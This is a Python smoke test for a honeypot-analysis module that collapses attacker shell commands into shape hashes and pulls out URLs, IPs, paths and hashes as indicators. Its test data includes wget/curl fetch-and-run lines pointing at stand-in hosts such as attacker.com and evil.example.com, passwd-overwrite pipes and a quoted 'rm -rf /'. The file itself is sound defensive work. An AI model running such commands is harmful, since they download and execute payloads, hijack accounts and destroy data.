"""Smoke test for ROADMAP #9 — functional-duplicate gating, shape signature.

Verifies `normalize_to_shape`, `compute_shape_hash`, and
`extract_iocs_regex` from `src/enrich/command_shape.py`:

  - Credential / password variants collapse to one shape hash (the
    user-reported `echo -e "...|...|..." | passwd` family).
  - URL / IP / path variants collapse: `wget <URL> -O <PATH> && sh <PATH>`.
  - Same-command identity returns identical hash on every call.
  - Different commands produce different hashes.
  - Parser noise + empty input return the degenerate "" hash so the
    gate falls back to standalone enrichment.
  - IOC regex pulls URL/IP/domain/hash/path from a raw command.

Standalone — no pytest, no ES.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_command_shape.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.command_shape import (
    compute_shape_hash,
    extract_iocs_regex,
    normalize_to_shape,
)

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    if cond:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  ({detail})")


# -----------------------------------------------------------------------------
# Password variants — the user's actual problem case
# -----------------------------------------------------------------------------

passwd_variants = [
    'echo -e "123456\\n99cenVDs8y2v\\n99cenVDs8y2v"|passwd',
    'echo -e "hunter2\\nXyZ123abc\\nXyZ123abc"|passwd',
    'echo -e "admin\\nQwErTy987\\nQwErTy987"|passwd',
    'echo -e "root\\nAaBbCc11\\nAaBbCc11"|passwd',
]
hashes = {compute_shape_hash(c) for c in passwd_variants}
check(
    "passwd credential variants collapse to one shape",
    len(hashes) == 1,
    f"got hashes={hashes}",
)

# -----------------------------------------------------------------------------
# wget+sh URL/path variants
# -----------------------------------------------------------------------------

wget_variants = [
    "wget http://1.2.3.4/x.sh -O /tmp/p && sh /tmp/p",
    "wget http://5.6.7.8/y.sh -O /var/run/q && sh /var/run/q",
    "wget http://9.10.11.12/payload -O /tmp/foo && sh /tmp/foo",
]
hashes = {compute_shape_hash(c) for c in wget_variants}
check(
    "wget URL/path variants collapse to one shape",
    len(hashes) == 1,
    f"got hashes={hashes}",
)

# -----------------------------------------------------------------------------
# Idempotence + uniqueness
# -----------------------------------------------------------------------------

h1 = compute_shape_hash("ls -la /tmp")
h2 = compute_shape_hash("ls -la /tmp")
check("idempotent: same input → same hash", h1 == h2)

different = [
    "ls -la",
    "cd /tmp",
    "wget http://x/y",
    "curl https://example.com/a | sh",
    "passwd -u user -o oldpass -n newpass",
]
hashes = {compute_shape_hash(c) for c in different}
check(
    "distinct commands → distinct hashes",
    len(hashes) == len(different),
    f"got {len(hashes)} hashes for {len(different)} commands",
)

# -----------------------------------------------------------------------------
# Degenerate inputs
# -----------------------------------------------------------------------------

check("empty string → degenerate hash", compute_shape_hash("") == "")
check("whitespace-only → degenerate hash", compute_shape_hash("   \t  ") == "")
check(
    "pure parser noise → degenerate hash",
    compute_shape_hash("}{\\}}\\}") == "",
)

# -----------------------------------------------------------------------------
# Specific placeholder set
# -----------------------------------------------------------------------------

sig = normalize_to_shape("wget http://1.2.3.4/x.sh -O /tmp/p && sh /tmp/p")
check(
    "URL becomes <URL>, paths become <PATH>",
    sig == "wget <URL> -O <PATH> && sh <PATH>",
    f"got: {sig!r}",
)

sig = normalize_to_shape("KEY=value cmd arg1 arg2")
check(
    "env assignment becomes <ENV>; bare args become <ARG>",
    sig == "<ENV> cmd <ARG> <ARG>",
    f"got: {sig!r}",
)

sig = normalize_to_shape("busybox wget http://attacker.com/x")
check(
    "multicall binary keeps subcommand name",
    sig == "busybox wget <URL>",
    f"got: {sig!r}",
)

# Unspaced operators must split — the existing _split_shell_segments
# misses this; command_shape uses shlex with punctuation_chars=True.
sig = normalize_to_shape("cmd1|cmd2")
check(
    "unspaced pipe operator splits segments",
    sig == "cmd1 | cmd2",
    f"got: {sig!r}",
)

# Quoted string with embedded shell separator must NOT split.
sig = normalize_to_shape('echo "; rm -rf /"')
check(
    "quoted shell separator does not split",
    sig.startswith("echo <ARG>") or sig == "echo <ARG>",
    f"got: {sig!r}",
)

# -----------------------------------------------------------------------------
# IOC regex extraction
# -----------------------------------------------------------------------------

iocs = extract_iocs_regex("wget http://1.2.3.4/x.sh -O /tmp/p")
check("IOC: URL pulled", "http://1.2.3.4/x.sh" in iocs["urls"])
check("IOC: IP pulled from URL host", "1.2.3.4" in iocs["ips"])
check("IOC: file path pulled", "/tmp/p" in iocs["files"])
check("IOC: no spurious domains for IP-host URL", iocs["domains"] == [])

iocs = extract_iocs_regex("curl https://evil.example.com/a.bin > /tmp/x.sh")
check("IOC: domain pulled from URL host", "evil.example.com" in iocs["domains"])
check("IOC: URL pulled (curl)", "https://evil.example.com/a.bin" in iocs["urls"])

# #2: hash extraction is now tool-context-gated. A prefixed `md5:HEX` is
# always pulled; a bare hex with no prefix/tool is NOT (avoids treating
# arbitrary hex tokens as file hashes).
iocs = extract_iocs_regex("md5:d41d8cd98f00b204e9800998ecf8427e")
check(
    "IOC: prefixed md5 hash pulled",
    "d41d8cd98f00b204e9800998ecf8427e" in iocs["hashes"],
)
iocs = extract_iocs_regex("md5sum dropper; d41d8cd98f00b204e9800998ecf8427e")
check(
    "IOC: bare hash pulled with hash tool present",
    "d41d8cd98f00b204e9800998ecf8427e" in iocs["hashes"],
)
iocs = extract_iocs_regex("echo d41d8cd98f00b204e9800998ecf8427e > x")
check(
    "IOC: bare hex with no tool/prefix NOT pulled",
    iocs["hashes"] == [],
)

# -----------------------------------------------------------------------------
# Summary
# -----------------------------------------------------------------------------
print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
